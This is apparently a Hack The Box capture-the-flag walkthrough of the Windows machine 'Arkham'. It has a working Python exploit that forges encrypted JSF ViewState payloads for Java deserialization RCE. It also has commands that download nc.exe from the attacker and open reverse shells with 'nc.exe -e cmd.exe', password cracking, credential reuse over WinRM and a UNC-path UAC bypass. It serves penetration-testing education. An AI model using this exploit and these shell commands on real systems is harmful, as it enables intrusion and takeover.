# Hack The Box — Arkham

### Full Walkthrough | Windows | Medium


## Machine Overview

|Field|Detail|
|---|---|
|Name|Arkham|
|OS|Windows Server 2019|
|Difficulty|Medium|
|IP|10.129.228.116|
|User Flag|`5fd09[redacted]4da350`|
|Root Flag|`3b712[redacted]be5bf9a`|

**Attack Chain Summary:**

```
Anonymous SMB → LUKS-encrypted disk image → crack password (batmanforever)
→ extract JSF HMAC/encryption key (JsF9876-)
→ forge malicious ViewState → Java deserialization RCE
→ shell as Alfred → backup.zip → OST email → Batman's password
→ WinRM lateral move → mount C$ over SMB → read root.txt
```

---

## Mindset & Methodology

Before touching a single tool, a good attacker internalises these principles:

**Follow the data, not the script.** Don't run every tool blindly. Each step should answer a question: "What can I reach? What does it give me? What does it unlock next?" Every finding is a breadcrumb, not a destination.

**Theme awareness.** Box creators leave hints. "BatShare", "Alfred", "Bruce", "Joker", "batmanforever" — these are not accidents. When a machine has a strong theme, lean into it when guessing passwords or looking for hidden context.

**Understand what you're exploiting.** Knowing _why_ a payload works (not just that it does) lets you adapt when things break. This box teaches LUKS encryption, JSF serialisation, HMAC signing, and Windows UAC — all real-world concepts.

**Layered privilege:** Most boxes have a chain: anonymous → low user → mid user → admin. Each link in that chain requires its own technique. Never skip ahead mentally — focus on the current link.

---

## Phase 1 — Reconnaissance

### Goal

Understand what services are exposed and which ones are worth investigating.

### Why nmap?

Nmap is your first contact with the target. You're asking: "What doors are open?" Without this step you're working blind. We always start here.

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/arkham 10.129.228.116
```

**Flag breakdown:**

|Flag|Meaning|
|---|---|
|`-sC`|Run default scripts (grabs banners, checks for common misconfigs)|
|`-sV`|Detect service versions (crucial — knowing it's Tomcat 8.5.37, not just "HTTP")|
|`-p-`|Scan all 65535 ports, not just top 1000|
|`--min-rate 5000`|Push scan speed up — HTB labs can handle this|
|`-oA`|Save output in all formats for later review|

### Results

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS 10.0
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http          Apache Tomcat 8.5.37
49666/tcp open  msrpc
49667/tcp open  msrpc
```

### Hacker Mindset — Reading nmap Output

Look at this output and ask:

- **Port 80 (IIS)** — Default IIS page, likely nothing here immediately. Note it.
- **Port 8080 (Tomcat)** — A Java application server. Tomcat is historically vulnerability-prone, especially around deserialization and admin panels. **High priority.**
- **Ports 139/445 (SMB)** — File sharing. Anonymous access is common on CTFs and in misconfigured corporate environments. **Check immediately.**
- **Ports 135/49666/49667 (RPC)** — Windows RPC. Less immediately useful, but confirms it's a Windows box.

**Decision:** Investigate SMB first (quick win potential), then Tomcat.

---

## Phase 2 — SMB Enumeration & File Retrieval

### Goal

Check if any SMB shares are accessible without credentials, and if so, what's in them.

### Why SMB first?

SMB null/guest sessions are a gift — they require no credentials and can expose files, user lists, or configuration data. It takes 30 seconds to check and can save hours.

```bash
smbclient -N -L //10.129.228.116
```

`-N` means no password (null session). `-L` lists shares.

### Output

```
Sharename    Type   Comment
---------    ----   -------
ADMIN$       Disk   Remote Admin
BatShare     Disk   Master Wayne's secrets
C$           Disk   Default share
IPC$         IPC    Remote IPC
Users        Disk
```

### Hacker Mindset — Share Names

`BatShare — Master Wayne's secrets` — a non-default share with a custom description. This is immediately suspicious. Custom shares exist because someone put something there deliberately.

`C$` and `ADMIN$` are default admin shares — almost certainly blocked without admin creds. Ignore them for now.

`Users` — potentially exposes user home directories.

### Accessing BatShare

```bash
smbclient -N //10.129.228.116/BatShare
```

Inside the SMB prompt:

```
smb: \> ls
  appserver.zip    A    4046695

smb: \> get appserver.zip
smb: \> exit
```

### Extracting the Archive

```bash
unzip appserver.zip
```

Contents:

- `IMPORTANT.txt` — A note from Bruce to Alfred about a Linux server backup image
- `backup.img` — The actual backup

```bash
file backup.img
# backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256]
```

### Hacker Mindset — LUKS Encryption

LUKS (Linux Unified Key Setup) is full-disk encryption for Linux. The fact that this is a _backup_ of a Linux server sitting on a _Windows_ box's SMB share is a major hint — whoever set this up was sloppy about access controls. The encryption is the only thing standing between us and the contents.

Our job now: break the encryption.

---

## Phase 3 — LUKS Image Cracking

### Goal

Obtain the passphrase for the LUKS-encrypted image to access its contents.

### Why a targeted wordlist?

LUKS is deliberately slow to brute-force (it uses key-stretching with many iterations). Running `rockyou.txt` in full (14 million passwords) at ~16 passwords/second would take **days**. We need to be smarter.

### Hacker Mindset — Theme-Based Wordlist

Every detail on this box screams Batman: the share is called BatShare, the note mentions Bruce and Alfred, the comment says "Master Wayne." When a box has a strong theme, wordlists filtered by that theme are disproportionately effective. This is a real-world skill — people use passwords from their interests.

```bash
grep -i batman /usr/share/wordlists/rockyou.txt > batman.txt
wc -l batman.txt
# ~900 passwords — manageable in under a minute
```

### Running the Crack

```bash
bruteforce-luks -t 4 -f batman.txt -v 10 backup.img
```

|Flag|Meaning|
|---|---|
|`-t 4`|4 threads|
|`-f`|Wordlist file|
|`-v 10`|Print progress every 10 seconds|

**Result:** `Password found: batmanforever`

### Mounting the Image

```bash
sudo cryptsetup luksOpen backup.img arkham_backup
# Enter passphrase: batmanforever

sudo mount /dev/mapper/arkham_backup /mnt
ls /mnt/Mask/
```

Contents:

```
docs/           Batman-Begins.pdf
joker.png
me.jpg
mycar.jpg
robin.jpeg
tomcat-stuff/   <-- this is the prize
```

### The Key File — web.xml.bak

```bash
cat /mnt/Mask/tomcat-stuff/web.xml.bak
```

Inside:

```xml
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>

<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
<param-value>HmacSHA1</param-value>

<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
```

Decode the secret:

```bash
echo "SnNGOTg3Ni0=" | base64 -d
# JsF9876-
```

### Hacker Mindset — Why This Matters

This is a backup of the _server's own configuration_. The `web.xml.bak` file is a leftover from a Java web application running on that server. It contains the secret key used to **sign and encrypt JSF ViewState tokens**.

Normally this key would stay server-side and never be visible. But because someone backed up the server and left the backup on an accessible share, we now have the keys to forge arbitrary ViewState tokens — which leads directly to Remote Code Execution.

Clean up:

```bash
cp -r /mnt/Mask/ ~/htb/arkham/
sudo umount /mnt
sudo cryptsetup luksClose arkham_backup
```

---

## Phase 4 — JSF ViewState Deserialization (RCE)

### Background — What is JSF ViewState?

JavaServer Faces (JSF) is a Java web framework. When you submit a form on a JSF page, the server needs to know what "state" the page was in — which components existed, what values they had. This state is serialised into a base64 blob called the **ViewState** and sent to the client as a hidden form field.

When the client submits the form, the ViewState comes back, and the server **deserialises** it to reconstruct the page state.

**The vulnerability:** Java deserialisation of untrusted data can lead to Remote Code Execution. When you deserialise a specially crafted Java object, the deserialiser executes code as part of the process of reconstructing the object graph.

**The protection that failed us:** The server uses HMAC-SHA1 to sign the ViewState and DES to encrypt it — so clients _shouldn't_ be able to tamper with it. But we have the key. We can forge any ViewState we want.

### The Crypto Structure

The ViewState is structured as:

```
base64( DES_ECB_encrypt(payload) + HMAC_SHA1(encrypted_payload) )
```

- **Encryption:** DES in ECB mode, key = `JsF9876-`
- **MAC:** HmacSHA1, key = `JsF9876-`
- **MAC position:** appended at the _end_ (last 20 bytes)

### Why ysoserial?

ysoserial is a tool that generates malicious serialised Java objects. It exploits known "gadget chains" — sequences of Java classes that, when deserialised, result in code execution. `CommonsCollections5` is a gadget chain that works with Apache Commons Collections 3.x, which Tomcat 8.5.37 ships with.

### Setting Up the Environment

```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \
     -O /opt/ysoserial.jar

# Install Python crypto library
pip install pycryptodome --break-system-packages
```

**Important — Java version:** ysoserial requires Java 8–11. Java 17+ breaks it. On this ARM64 Kali system we use the Java 11 JVM explicitly:

```bash
# Confirm Java 11 is available
/usr/lib/jvm/java-11-openjdk-arm64/bin/java -version
```

### The Exploit Script

```python
#!/usr/bin/env python3
# exploit.py — JSF ViewState deserialisation RCE for Arkham

import requests
import subprocess
import sys
from base64 import b64encode
from Crypto.Cipher import DES
from Crypto.Hash import SHA, HMAC
from os import devnull

JAVA      = '/usr/lib/jvm/java-11-openjdk-arm64/bin/java'
YSOSERIAL = '/opt/ysoserial.jar'
TARGET    = 'http://10.129.228.116:8080/userSubscribe.faces'
KEY       = b'JsF9876-'           # decoded from SnNGOTg3Ni0=

cmd = sys.argv[1]

# Step 1: Generate malicious serialised Java payload
with open(devnull, 'w') as null:
    payload = subprocess.check_output(
        [JAVA, '-jar', YSOSERIAL, 'CommonsCollections5', cmd],
        stderr=null
    )

# Step 2: PKCS padding to align to DES 8-byte block boundary
pad = (8 - (len(payload) % 8)) % 8
padded = payload + (chr(pad) * pad).encode()

# Step 3: Encrypt with DES-ECB
d = DES.new(KEY, DES.MODE_ECB)
enc_payload = d.encrypt(padded)

# Step 4: Sign with HMAC-SHA1
sig = HMAC.new(KEY, enc_payload, SHA).digest()

# Step 5: Assemble ViewState = base64(encrypted + signature)
viewstate = b64encode(enc_payload + sig)

# Step 6: Submit as a JSF form POST
sess = requests.session()
sess.get(TARGET)          # get a valid JSESSIONID first
sess.post(TARGET, data={
    'j_id_jsp_1623871077_1%3Aemail':  'd',
    'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',
    'j_id_jsp_1623871077_1_SUBMIT':   '1',
    'javax.faces.ViewState':           viewstate
})
print("[+] Payload sent")
```

### Verifying RCE with a Ping Test

Before going straight for a shell, always verify execution with something observable and harmless:

**Terminal 1:**

```bash
sudo tcpdump -i tun0 icmp
```

**Terminal 2:**

```bash
python3 exploit.py "ping -n 2 10.10.14.6"
```

Expected output in Terminal 1:

```
IP 10.129.228.116 > 10.10.14.6: ICMP echo request
IP 10.10.14.6 > 10.129.228.116: ICMP echo reply
```

### Hacker Mindset — Why Ping Before Shell?

This is the professional approach. If you go straight for a reverse shell and it doesn't work, you don't know _which part_ failed:

- Is the payload wrong?
- Is the port blocked?
- Is the binary broken?

A successful ping confirms: the deserialization works, the server executes our commands, and outbound traffic reaches us. Now the only variable left is the shell binary and port.

---

## Phase 5 — Shell as Alfred + User Flag

### Uploading Netcat

The target is Windows. We need a Windows netcat binary. AppLocker may be enabled (it is here), so we write to a known AppLocker-safe path: `C:\Windows\System32\spool\drivers\color\`

**Terminal 1 — serve the binary:**

```bash
cd ~/htb/arkham
python3 -m http.server 80
```

**Terminal 2 — upload:**

```bash
python3 exploit.py "powershell -c Invoke-WebRequest -Uri http://10.10.14.6/nc.exe -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe"
```

### Triggering the Shell

**Terminal 2 — listener:**

```bash
rlwrap nc -lnvp 443
```

**Terminal 3 — execute:**

```bash
python3 exploit.py "C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.6 443"
```

> **Note:** Use port 443 rather than arbitrary high ports. Windows firewalls and corporate policies typically allow outbound 443 (HTTPS). HTB machines are no different.

> **Note:** `rlwrap` wraps nc to give you arrow key history and line editing — always use it on Windows shells.

### Shell Catch

```
connect to [10.10.14.6] from (UNKNOWN) [10.129.228.116] 49685
Microsoft Windows [Version 10.0.17763.107]

C:\tomcat\apache-tomcat-8.5.37\bin> whoami
arkham\alfred
```

### User Flag

```
C:\> type C:\Users\Alfred\Desktop\user.txt
5fd09[redacted]7b4da350
```

---

## Phase 6 — Lateral Movement to Batman

### Enumeration as Alfred

First rule after landing a shell: **enumerate before you exploit**. Understand what you have access to.

```
C:\> net users
Administrator   Alfred   Batman   DefaultAccount   Guest   WDAGUtilityAccount

C:\> net user batman
Local Group Memberships: *Administrators  *Remote Management Use  *Users
```

Batman is in the **Administrators** group and the **Remote Management Users** group. That means:

1. If we get Batman's credentials, we can run commands as a local admin
2. We can use WinRM (PS remoting) to get a session as Batman

Now find Batman's password.

### Finding the Backup

```
C:\> dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
C:\Users\Alfred\Desktop\user.txt
C:\Users\Alfred\Documents\tomcat.bat
C:\Users\Alfred\Downloads\backups\backup.zip
```

`backup.zip` in Downloads. Always check user home directories for leftover files — developers and admins frequently leave credentials, backups, or notes there.

### Transferring backup.zip to Kali

Guest SMB is blocked on this box (Windows Server 2019 disables it by default). We need to authenticate our SMB server:

**Kali:**

```bash
impacket-smbserver -smb2support -username kali -password kali share ~/htb/arkham/
```

**Alfred shell:**

```
net use \\10.10.14.6\share /u:kali kali
copy C:\Users\Alfred\Downloads\backups\backup.zip \\10.10.14.6\share\
net use \\10.10.14.6\share /delete
```

### Extracting the OST File

```bash
unzip backup.zip
file alfred@arkham.local.ost
# Microsoft Outlook email folder (>=2003)
```

An `.ost` file is an Outlook offline mailbox cache. It stores emails, calendar entries, and attachments locally. We can read it on Linux with `readpst`:

```bash
readpst -S alfred@arkham.local.ost
ls -la Drafts/
# 1               (email body)
# 1-image001.png  (attachment)
```

### The Password

Opening `Drafts/1-image001.png` reveals a screenshot of a password manager or sticky note:

```
Batman's password: Zx^#QZX+T!123
```

The email subject reads: _"Master Wayne stop forgetting your password"_ — Alfred emailing Bruce's password to himself as a reminder. Classic credential mismanagement.

### Spawning a Shell as Batman

From the Alfred shell, use PowerShell remoting (WinRM) to run commands as Batman. We use `Invoke-Command` to execute our already-uploaded nc.exe under Batman's credentials:

**Kali — new listener:**

```bash
rlwrap nc -lnvp 4445
```

**Alfred shell:**

```powershell
powershell
$username = 'batman'
$password = 'Zx^#QZX+T!123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ComputerName ARKHAM -Credential $credential -ScriptBlock {
    C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.6 4445
}
```

```
connect to [10.10.14.6] from (UNKNOWN) [10.129.228.116] 49690

C:\Users\Batman\Documents> whoami
arkham\batman
```

---

## Phase 7 — Root Flag via SMB UNC Bypass

### The Problem — UAC

Batman is in the Administrators group, but that doesn't mean every process he runs has admin privileges. Windows **User Account Control (UAC)** splits admin tokens: even admin users run with a filtered (non-elevated) token by default.

```
C:\> type C:\Users\Administrator\Desktop\root.txt
Access is denied.
```

Even as Batman, direct file access to `C:\Users\Administrator\` is blocked by UAC.

### The Bypass — SMB UNC Path

Here's the trick: when you access a share via UNC path (e.g. `\\ARKHAM\C$`), Windows evaluates the access using the **network token** rather than the local interactive token. Network logons for local administrators bypass UAC's token filtering.

In other words: you can't read `C:\Users\Administrator\Desktop\root.txt` directly, but you _can_ read `\\ARKHAM\C$\Users\Administrator\Desktop\root.txt` — same file, different access path, different token evaluation.

```
C:\Users\Batman\Documents> net use Z: \\ARKHAM\C$
The command completed successfully.

C:\Users\Batman\Documents> type Z:\Users\Administrator\Desktop\root.txt
3b71[redacted]dbe5bf9a
```

### Hacker Mindset — Unintended but Valid

This is called an "unintended" solution — the box creator likely wanted players to do a proper UAC bypass (e.g. via `SystemPropertiesAdvanced.exe` DLL hijacking). But the SMB UNC trick is equally valid and, in real engagements, is exactly the kind of lateral thinking that separates good pentesters from script kiddies.

The lesson: UAC is not a security boundary between users. It's a protection against privilege escalation _within_ a user's own session. An admin accessing their own machine over the network doesn't trigger the same restrictions.

---

## Key Takeaways

### 1. Anonymous Access is Often a Critical Foothold

SMB null sessions are still common in enterprise environments. Always check. A single misconfigured share can hand you credentials, keys, or source code.

### 2. Backups Are Dangerous

Backup files often contain secrets that aren't protected like production systems. The LUKS image contained Tomcat's secret key. In real engagements, backup directories are gold.

### 3. Java Deserialisation is Powerful but Finicky

Understanding the crypto wrapper (DES + HMAC) was essential. ysoserial generates the payload, but you need to understand the protocol to deliver it correctly. Blindly running tools without understanding the surrounding context will get you nowhere on this box.

### 4. Credential Material Lives Everywhere

Alfred's email backup — stored in a zip, in Downloads, on a user profile — contained Batman's password. Users cache, backup, and misstore credentials constantly. Enumerate home directories thoroughly.

### 5. UAC is Not a Security Boundary

Batman had admin group membership. The UAC restriction was bypassed trivially via a UNC path. True security boundaries in Windows are object ACLs and privilege tokens — UAC is a user convenience feature, not a security feature between network-accessible endpoints.

---

## Commands Cheatsheet

```bash
# SMB enumeration
smbclient -N -L //10.129.228.116
smbclient -N //10.129.228.116/BatShare

# LUKS cracking
grep -i batman /usr/share/wordlists/rockyou.txt > batman.txt
bruteforce-luks -t 4 -f batman.txt -v 10 backup.img
sudo cryptsetup luksOpen backup.img arkham_backup   # pw: batmanforever
sudo mount /dev/mapper/arkham_backup /mnt

# Extract JSF key
grep -A1 "SECRET\|MAC_SECRET" /mnt/Mask/tomcat-stuff/web.xml.bak
echo "SnNGOTg3Ni0=" | base64 -d   # => JsF9876-

# RCE
sudo tcpdump -i tun0 icmp
python3 exploit.py "ping -n 2 <KALI_IP>"

# Shell delivery
python3 -m http.server 80
rlwrap nc -lnvp 443
python3 exploit.py "powershell -c Invoke-WebRequest -Uri http://<KALI_IP>/nc.exe -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe"
python3 exploit.py "C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe <KALI_IP> 443"

# Lateral move
impacket-smbserver -smb2support -username kali -password kali share .
readpst -S alfred@arkham.local.ost

# Root
net use Z: \\ARKHAM\C$
type Z:\Users\Administrator\Desktop\root.txt
```

---

_Walkthrough by Abdullah | HTB Pro Hacker | Arkham — Owned_
